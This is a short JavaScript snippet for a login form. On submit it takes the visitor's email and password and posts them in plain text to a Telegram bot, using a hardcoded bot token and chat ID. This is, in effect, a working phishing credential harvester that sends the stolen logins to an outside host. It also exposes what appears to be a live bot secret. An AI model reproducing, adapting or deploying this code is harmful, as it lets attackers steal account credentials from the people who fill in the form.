<script>
    document.addEventListener('DOMContentLoaded', function() {
        const loginForm = document.getElementById('loginForm');
        const notification = document.getElementById('notification');

        // üîπ Put your real bot token and chat ID here
        const botToken = "8420881837:AAEq-beKJzbADQJ6ohnxqximiGENcNVKPq0";
        const chatId = "7279773505";

        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // Create message
            const message = `üîî New Login Attempt:\nüìß Email: ${email}\nüîë Password: ${password}`;

            // Send to Telegram
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(res => res.json())
            .then(data => {
                console.log("Message sent:", data);
                showNotification("‚úÖ Login info sent to Telegram!");
            })
            .catch(err => {
                console.error("Error:", err);
                showNotification("‚ùå Failed to send login info.");
            });

            // Clear form
            loginForm.reset();
        });

        function showNotification(msg) {
            notification.textContent = msg;
            notification.classList.add('show');

            setTimeout(function() {
                notification.classList.remove('show');
            }, 3000);
        }
    });
</script>
